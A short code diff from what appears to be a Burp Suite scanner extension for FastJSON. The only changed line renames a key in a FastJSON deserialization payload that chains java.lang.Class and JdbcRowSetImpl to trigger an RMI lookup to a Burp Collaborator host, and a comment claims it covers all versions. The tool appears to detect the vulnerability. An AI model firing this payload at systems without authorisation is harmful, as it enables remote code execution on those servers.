@@ -162,7 +162,7 @@ public class FastJson {
         IBurpCollaboratorClientContext collaboratorClientContext = callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
         // 据说可以覆盖所有版本
-        String poc = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/aaa\",\"autoCommit\":true}}";
+        String poc = "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/aaa\",\"autoCommit\":true}}";
 
         // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
         // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
